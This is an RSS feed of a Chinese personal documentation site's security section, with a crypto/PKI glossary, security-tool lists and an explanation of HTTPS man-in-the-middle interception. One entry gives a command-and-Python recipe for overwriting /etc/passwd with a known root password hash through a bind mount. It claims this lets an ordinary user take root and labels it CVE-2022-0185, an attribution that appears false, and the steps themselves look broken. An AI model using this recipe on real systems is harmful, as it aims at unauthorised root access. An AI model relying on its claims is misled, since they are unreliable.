<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>断念梦的站点 – 🔐7.信息安全</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/</link><description>Recent content in 🔐7.信息安全 on 断念梦的站点</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><atom:link href="https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: Glossary</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Glossary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Glossary/</guid><description>
&lt;h1 id="概述">概述&lt;a class="td-heading-self-link" href="#%e6%a6%82%e8%bf%b0" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;blockquote>
&lt;p>参考：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://datatracker.ietf.org/doc/html/rfc4949">RFC 4949(互联网安全术语)&lt;/a>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>&lt;strong>Crypto(密码学)&lt;/strong> # 算是 &lt;strong>Cryptographic&lt;/strong> 的前缀简写吧&lt;/p>
&lt;p>&lt;strong>Entity(实体)&lt;/strong> # 是任何存在的东西（anything that exists） —— 即使 只在逻辑或概念上存在（even if only exists logically or conceptually）。 例如，&lt;/p>
&lt;ul>
&lt;li>你的计算机是一个 entity，&lt;/li>
&lt;li>你写的代码也是一个 entity，&lt;/li>
&lt;li>你自己也是一个 entity，&lt;/li>
&lt;li>你吃的杂粮饼也是一个 entity，&lt;/li>
&lt;li>你六岁时见过的幽灵也是一个 entity —— 即使你妈告诉你幽灵并不存在，这只是你的臆想。&lt;/li>
&lt;li>所以
&lt;ul>
&lt;li>CA 也算一个实体&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Identity(身份)&lt;/strong> # 每个 entity（实体）都有一个 identity（身份）。 要精确定义这个概念比较困难，这么来说吧：identity 是使你之所以为你 （what makes you you）的东西。&lt;/p>
&lt;ul>
&lt;li>具体到计算机领域，identity 通常用一系列属性来表示，描述某个具体的 entity， 这里的属性包括 group、age、location、favorite color、shoe size 等等。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Identifier(身份标识符)&lt;/strong> # Identifier 跟 identity 还不是一个东西：每个 identifier 都是一个唯一标识符， 也唯一地关联到某个有 identity 的 entity。&lt;/p>
&lt;ul>
&lt;li>例如，我是 Mike，但 Mike 并不是我的 identity，而只是个 name —— 虽然二者在我们 小范围的讨论中是同义的。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Claim(声明) &amp;amp; Authentication(认证)&lt;/strong> #&lt;/p>
&lt;ul>
&lt;li>一个 entity 能 claim（声明）说，它拥有某个或某些 name。&lt;/li>
&lt;li>其他 entity 能够对这个 claim 进行认证（authenticate），以确认这份声明的真假。一般来说，认证的目的是确认某些 claim 的合法性。&lt;/li>
&lt;li>Claim 不是只能关联到 name，还可以关联到别的东西。例如，我能 claim 任何东西： my age, your age, access rights, the meaning of life 等等。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Subscriber &amp;amp; CA &amp;amp; relying party (RP)&lt;/strong> #&lt;/p>
&lt;ul>
&lt;li>能作为一个证书的 subject 的 entity，称为 subscriber（证书 owner）或 end entity。对应地，subscriber 的证书有时也称为 end entity certificates 或 leaf certificates， 原因在后面讨论 certificate chains 时会介绍。&lt;/li>
&lt;li>CA（certificate authority，证书权威）是给 subscriber 颁发证书的 entity，是一种 certificate issuer（证书颁发者）。CA 的证书，通常称为 root certificate 或 intermediate certificate，具体取决于 CA 类型。&lt;/li>
&lt;li>Relying party 是 使用证书的用户（certificate user），它验证由 CA 颁发（给 subscriber）的证书是否合法。一个 entity 可以同时是一个 subscriber 和一个 relying party。 也就是说，单个 entity 既有自己的证书，又使用其他证书来认证 remote peers， 例如双向 TLS（mutual TLS，mTLS）场景。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>key(密钥)&lt;/strong> # 在密码学中，是指某个用来完成加密、解密、完整性验证等密码学应用的秘密信息。对于加密算法，key 指定明文转换成密文；对于解密算法，key 指定密文转换成明文&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Plaintext/Cleartext(明文)&lt;/strong> # 在密码学中，明文是未加密的信息，可以供人类和计算机读取的信息&lt;/li>
&lt;li>&lt;strong>Ciphertext/Cyphertext(密文)&lt;/strong> # 在密码学中，密文是明文通过加密算法计算后生成的人类或计算器无法读取的一种信息
&lt;ul>
&lt;li>cipher 和 cypher 是同一个意思，两种不同的拼写方法&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Key Generation(密钥生成)&lt;/strong> # &lt;a href="https://en.wikipedia.org/wiki/Key_generation">详见 Wiki&lt;/a>。密钥一般都是各种程序根据指定算法生成的。&lt;/p>
&lt;p>&lt;strong>Password(密码)&lt;/strong> 与 &lt;strong>Key(密钥) 的区别&lt;/strong> # 详见 &lt;a href="https://en.wikipedia.org/wiki/Key_(cryptography)">Wiki Key，Key vs Password&lt;/a>。&lt;/p>
&lt;ul>
&lt;li>对于大多数计算机安全目的和大多数用户而言，“密钥”与“密码”（或“密码短语”）并不相同，尽管实际上可以将密码用作密钥。密钥和密码之间的主要实际区别在于，密码和密码旨在由人类用户生成，读取，记住和再现（尽管用户可以将这些任务委托给密码管理软件）。相反，密钥旨在由实现密码算法的软件使用，因此不需要人类可读性等。实际上，大多数用户在大多数情况下甚至都不知道其日常软件应用程序的安全组件正在使用代表他们的密钥。&lt;/li>
&lt;li>如果 &lt;a href="https://en.wikipedia.org/wiki/Password">密码&lt;/a> 被用作加密密钥，然后在精心设计的密码系统就不会这样使用它自己。这是因为密码往往是人类可读的，因此可能不是特别强。作为补偿，一个好的加密系统将不使用_密码作为密钥_来执行主要的加密任务本身，而是充当&lt;a href="https://en.wikipedia.org/wiki/Key_derivation_function">密钥派生功能&lt;/a>（KDF）的输入。该 KDF 使用密码作为起点，然后它将从该起点本身生成实际的安全加密密钥。世代可以使用各种方法，例如添加盐和拉伸键。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Encoding(编码)&lt;/strong> # 将数据的原始格式，转换为便于存储的格式&lt;/p>
&lt;p>&lt;strong>Decoding(解码)&lt;/strong> # 将存储的数据转换为原始格式以便使用&lt;/p>
&lt;p>&lt;strong>Encrypt(加密)&lt;/strong> # 使用 Key(密钥) 对信息进行编码的过程。&lt;/p>
&lt;p>&lt;strong>Decrypt(解密)&lt;/strong> # 使用 Key(密钥) 对信息进行解码的过程&lt;/p>
&lt;p>&lt;strong>Encoding(编码) 与 Encrypt(加密) 的区别&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>编码使用公开的方案，将数据转换为另一种格式，便于维护数据与传播。任何人都可以使用相同的编码规范，解码数据&lt;/li>
&lt;li>加密使用私密的方法，将数据抓换为另一种格式，着重于数据的保密。只有拥有相同 Key 的人才可以使用相同的加密规范，解密数据&lt;/li>
&lt;li>总结：编码和加密都是对格式的一种转换，但是它们是有区别的。&lt;strong>编码是公开的&lt;/strong>，比如 Base 64 编码，任何人都可以解码；&lt;strong>而加密则相反，你只希望自己或者特定的人才可以对内容进行解密。&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Signature(签名)&lt;/strong> # 非对称加密中，使用私钥进行数字签名的行为。&lt;/p>
&lt;p>&lt;strong>Verifying(验证)&lt;/strong> # 非对称加密中，使用公钥验证数字签名的行为。&lt;/p>
&lt;p>&lt;strong>Digital Signature(数字签名)&lt;/strong> # &lt;a href="https://en.wikipedia.org/wiki/Digital_signature">详见 Wiki&lt;/a>。用于检验数字消息或文件的真实性的数学方案&lt;/p>
&lt;p>&lt;strong>Public Key Cryptography Standards(非对称密钥加密标准，简称 PKCS)&lt;/strong> # &lt;a href="https://en.wikipedia.org/wiki/PKCS">详见 Wiki&lt;/a>。该标准指定了使用公开密钥加密技术时所应该遵守的标准&lt;/p>
&lt;p>&lt;strong>Public Key Infrastructure(非对称密钥基础设施，简称 PKI)&lt;/strong> # &lt;a href="https://en.wikipedia.org/wiki/Public_key_infrastructure">详见 Wiki&lt;/a>。一个包括硬件、软件、人员、策略和规程的集合，用来实现基于公钥密码体制的密钥和证书的产生、管理、存储、分发和撤销等功能。&lt;/p>
&lt;p>&lt;strong>Secure Hash Algorithm(安全哈希算法，简称 SHA)&lt;/strong>&lt;/p>
&lt;p>&lt;strong>Personal Identification Number(个人识别码，简称 PIN)&lt;/strong>&lt;/p>
&lt;h1 id="其他">其他&lt;a class="td-heading-self-link" href="#%e5%85%b6%e4%bb%96" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;p>&lt;strong>Information security management system(信息安全管理系统，简称 ISMS)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Information_security_management">https://en.wikipedia.org/wiki/Information_security_management&lt;/a>&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>英文&lt;/th>
&lt;th>中文&lt;/th>
&lt;th>缩写与简称&lt;/th>
&lt;th>链接&lt;/th>
&lt;th>解释&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Brute-force attack&lt;/td>
&lt;td>暴力破解&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://en.wikipedia.org/wiki/Brute-force_attack">Wiki&lt;/a>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></description></item><item><title>Docs: 信息安全</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/</guid><description>
&lt;h1 id="概述">概述&lt;a class="td-heading-self-link" href="#%e6%a6%82%e8%bf%b0" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;blockquote>
&lt;p>参考：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Information_security">Wiki，Information_security&lt;/a>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>&lt;strong>Information security(信息安全，简称 infosec)&lt;/strong> 是通过降低信息风险来保护信息的实践。&lt;/p>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/Data_security">Data secruity&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/Network_security">Network security&lt;/a>&lt;/p>
&lt;h1 id="待总结">待总结&lt;a class="td-heading-self-link" href="#%e5%be%85%e6%80%bb%e7%bb%93" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;p>要研究态势感知或安全运营中心，可以采用 OSSIM&lt;/p>
&lt;p>要研究入侵防御技术，可以采用 Snort 或 Security Onion&lt;/p>
&lt;p>要研究防火墙技术，可以采用 pfSense 或 OPNsense&lt;/p>
&lt;p>要研究 Web 应用防火墙（WAF ），可以采用 ModSecurity&lt;/p>
&lt;p>要研究威胁情报技术，可以采用 MISP 或 OpenCTI&lt;/p>
&lt;p>要研究漏洞扫描技术，可以采用 OpenVAS 或 W3AF&lt;/p>
&lt;p>要研究堡垒机技术，可以采用 JumpServer&lt;/p>
&lt;p>要研究蜜罐技术，可以采用 T-Pot 或 Hfish&lt;/p>
&lt;h1 id="历史漏洞">历史漏洞&lt;a class="td-heading-self-link" href="#%e5%8e%86%e5%8f%b2%e6%bc%8f%e6%b4%9e" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;h2 id="cve-2022-0185">CVE-2022-0185&lt;a class="td-heading-self-link" href="#cve-2022-0185" aria-label="Heading self-link">&lt;/a>&lt;/h2>
&lt;p>&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185&lt;/a> 漏洞，通过如下操作，可以让普通用户直接重置 root 密码。主要利用的是 bind mount 功能，将 /etc/passwd 文件覆盖&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#204a87">cd&lt;/span> ~
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cp /etc/passwd ./
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ openssl passwd -1 -salt abc password
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$1$abc$BXBqpb9BZcZhXLgbee&lt;/span>.0s/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将第一行的 root:x 改为 root:$1$abc$BXBqpb9BZcZhXLgbee.0s/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ head -2 passwd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root:&lt;span style="color:#000">$1$abc$BXBqpb9BZcZhXLgbee&lt;/span>.0s/:0:0:root:/root:/bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat mount-passwd.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>from ctypes import *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">libc&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> CDLL&lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc.mount.argtypes &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>c_char_p, c_char_p, c_char_p, c_ulong, c_char_p&lt;span style="color:#ce5c00;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">MS_BIND&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4096&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">source&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> b&lt;span style="color:#4e9a06">&amp;#34;&amp;lt;HOME&amp;gt;/passwd&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">target&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> b&lt;span style="color:#4e9a06">&amp;#34;/etc/passwd&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">filesystemtype&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> b&lt;span style="color:#4e9a06">&amp;#34;none&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">options&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> b&lt;span style="color:#4e9a06">&amp;#34;rw&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mountflags&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> MS_BIND
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc.mount&lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>source, target, filesystemtype, mountflags, options&lt;span style="color:#ce5c00;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>把上面的 &amp;lt;HOME&amp;gt; 换成你的 home 目录
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python3 mount-passwd.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ su root
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>输入密码：password
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="信息安全历史">信息安全历史&lt;a class="td-heading-self-link" href="#%e4%bf%a1%e6%81%af%e5%ae%89%e5%85%a8%e5%8e%86%e5%8f%b2" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;p>&lt;a href="https://www.bilibili.com/video/BV1uu4y1X7FX?spm_id_from=333.1245.0.0">B 站，俄罗斯黑客的激荡三十年&lt;/a>&lt;/p></description></item><item><title>Docs: Cryptography</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Cryptography/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Cryptography/</guid><description/></item><item><title>Docs: Crypto mgmt tools</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Crypto-mgmt-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Crypto-mgmt-tools/</guid><description/></item><item><title>Docs: Access Control</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Access-Control/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Access-Control/</guid><description/></item><item><title>Docs: Network analysis</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Network-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Network-analysis/</guid><description/></item><item><title>Docs: Packet analyzer</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Packet-analyzer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Packet-analyzer/</guid><description/></item><item><title>Docs: Reverse engineering</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Reverse-engineering/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Reverse-engineering/</guid><description/></item><item><title>Docs: Crawler</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Crawler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Crawler/</guid><description/></item><item><title>Docs: Bastion Host</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Bastion-Host/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Bastion-Host/</guid><description>
&lt;h1 id="概述">概述&lt;a class="td-heading-self-link" href="#%e6%a6%82%e8%bf%b0" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;blockquote>
&lt;p>参考：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Bastion_host">Wiki，Bastion host&lt;/a>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>&lt;strong>Bastion Host(堡垒机)&lt;/strong>&lt;/p>
&lt;h1 id="jumpserver">JumpServer&lt;a class="td-heading-self-link" href="#jumpserver" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;p>&lt;a href="https://github.com/jumpserver/jumpserver/">GitHub 项目，jumpserver/jumpserver&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://jumpserver.org/">https://jumpserver.org/&lt;/a>&lt;/p>
&lt;h1 id="oneterm">OneTerm&lt;a class="td-heading-self-link" href="#oneterm" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;p>&lt;a href="https://github.com/veops/oneterm">GitHub 项目，veops/oneterm&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/iFy83vu3Yybj1X6gypPKjg">公众号 - Kubernetes技术栈，开源推荐｜简洁且强大的开源堡垒机OneTerm&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/AyY0SknYGjJhQbbWHu7-bQ">公众号 - Kubernetes技术栈，用了两周开源堡垒机OneTerm，我有一些建议&lt;/a>&lt;/p></description></item><item><title>Docs: Security software</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Security-software/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Security-software/</guid><description/></item><item><title>Docs: Vulnerable</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Vulnerable/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Vulnerable/</guid><description>
&lt;h1 id="概述">概述&lt;a class="td-heading-self-link" href="#%e6%a6%82%e8%bf%b0" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;blockquote>
&lt;p>参考：&lt;/p>
&lt;ul>
&lt;li>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>&lt;strong>Vulnerable&lt;/strong> 在中文环境那种可以称为 靶场、靶站、etc. ，用来描述在安全测试过程中充当被攻击或者主动检测的目标。&lt;/p>
&lt;blockquote>
&lt;p>英文中好像没有一个明确的词儿可以和 靶场、靶站 相对应，这个词是从 Vulhub 项目中找到的。&lt;/p>
&lt;/blockquote>
&lt;h1 id="vulhub">Vulhub&lt;a class="td-heading-self-link" href="#vulhub" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;blockquote>
&lt;p>参考：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/vulhub/vulhub">GitHub 项目，vulhub/vulhub&lt;/a>&lt;/li>
&lt;/ul>
&lt;/blockquote></description></item><item><title>Docs: Hacking</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Hacking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Hacking/</guid><description>
&lt;h1 id="概述">概述&lt;a class="td-heading-self-link" href="#%e6%a6%82%e8%bf%b0" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;p>Flipper Zero 是一款玩具般的便携式多功能工具，适合渗透测试人员和极客。它喜欢破解数字内容，例如无线电协议、访问控制系统、硬件等。它是完全开源和可定制的，因此您可以按照自己喜欢的方式扩展它。&lt;/p>
&lt;h1 id="名词解释">名词解释&lt;a class="td-heading-self-link" href="#%e5%90%8d%e8%af%8d%e8%a7%a3%e9%87%8a" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;p>补充一个小知识点，软件漏洞在英文里不是 Hole——孔洞，而是 &lt;strong>Vulnerability(脆弱性)&lt;/strong>，因为软件里的漏洞往往不会是一个明晃晃的“洞”，而是一个不起眼的“脆弱性”。&lt;/p>
&lt;p>&lt;strong>Robo Hacking Game(机器人网络安全大赛，简称 RHG)&lt;/strong> 是中国版的 CGC 大赛。&lt;/p>
&lt;p>&lt;strong>Cyber Grand Challenge(网络空间超级挑战赛，简称 CGC)&lt;/strong> 是 &lt;strong>Defense Advanced Research Projects Agency(国防高级研究计划局，简称 DARPA)&lt;/strong> 举办的比赛。&lt;/p>
&lt;h2 id="安全公司">安全公司&lt;a class="td-heading-self-link" href="#%e5%ae%89%e5%85%a8%e5%85%ac%e5%8f%b8" aria-label="Heading self-link">&lt;/a>&lt;/h2>
&lt;p>深信服&lt;/p>
&lt;p>360&lt;/p>
&lt;p>永信至诚&lt;/p></description></item><item><title>Docs: 中间人攻击与HTTPS抓包</title><link>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E4%B8%8EHTTPS%E6%8A%93%E5%8C%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E4%B8%8EHTTPS%E6%8A%93%E5%8C%85/</guid><description>
&lt;h1 id="概述">概述&lt;a class="td-heading-self-link" href="#%e6%a6%82%e8%bf%b0" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;blockquote>
&lt;p>参考：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://mp.weixin.qq.com/s/IYZrtK7pJTeCOBwY-sC9HA">公众号-小林 coding，字节一面：HTTPS 一定安全可靠吗？&lt;/a>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>&lt;strong>HTTPS 一定安全可靠吗？&lt;/strong>&lt;/p>
&lt;p>这个问题的场景是这样的：客户端通过浏览器向服务端发起 HTTPS 请求时，被「假基站」转发到了一个「中间人服务器」，于是客户端是和「中间人服务器」完成了 TLS 握手，然后这个「中间人服务器」再与真正的服务端完成 TLS 握手。&lt;/p>
&lt;p>&lt;img src="https://mmbiz.qpic.cn/mmbiz_png/J0g14CUwaZf0Dm1SNmvUayxCflHTROibNicwUSq8LhcU0v5GWmgbAfafNE9hhWWR21UBeUSemHqPicHPynYS0A9CA/640?wx_fmt=png" alt="">&lt;/p>
&lt;p>具体过程如下：&lt;/p>
&lt;ul>
&lt;li>客户端向服务端发起 HTTPS 建立连接请求时，然后被「假基站」转发到了一个「中间人服务器」，接着中间人向服务端发起 HTTPS 建立连接请求，此时客户端与中间人进行 TLS 握手，中间人与服务端进行 TLS 握手；&lt;/li>
&lt;li>在客户端与中间人进行 TLS 握手过程中，中间人会发送自己的公钥证书给客户端，&lt;strong>客户端验证证书的真伪&lt;/strong>，然后从证书拿到公钥，并生成一个随机数，用公钥加密随机数发送给中间人，中间人使用私钥解密，得到随机数，此时双方都有随机数，然后通过算法生成对称加密密钥（A），后续客户端与中间人通信就用这个对称加密密钥来加密数据了。&lt;/li>
&lt;li>在中间人与服务端进行 TLS 握手过程中，服务端会发送从 CA 机构签发的公钥证书给中间人，从证书拿到公钥，并生成一个随机数，用公钥加密随机数发送给服务端，服务端使用私钥解密，得到随机数，此时双方都有随机数，然后通过算法生成对称加密密钥（B），后续中间人与服务端通信就用这个对称加密密钥来加密数据了。&lt;/li>
&lt;li>后续的通信过程中，中间人用对称加密密钥（A）解密客户端的 HTTPS 请求的数据，然后用对称加密密钥（B）加密 HTTPS 请求后，转发给服务端，接着服务端发送 HTTPS 响应数据给中间人，中间人用对称加密密钥（B）解密 HTTPS 响应数据，然后再用对称加密密钥（A）加密后，转发给客户端。&lt;/li>
&lt;/ul>
&lt;p>从客户端的角度看，其实并不知道网络中存在中间人服务器这个角色。&lt;/p>
&lt;p>那么中间人就可以解开浏览器发起的 HTTPS 请求里的数据，也可以解开服务端响应给浏览器的 HTTPS 响应数据。相当于，中间人能够 “偷看” 浏览器与服务端之间的 HTTPS 请求和响应的数据。&lt;/p>
&lt;p>但是要发生这种场景是有前提的，&lt;strong>前提是用户点击接受了中间人服务器的证书。&lt;/strong>&lt;/p>
&lt;p>中间人服务器与客户端在 TLS 握手过程中，实际上发送了自己伪造的证书给浏览器，而这个伪造的证书是能被浏览器（客户端）识别出是非法的，于是就会提醒用户该证书存在问题。&lt;/p>
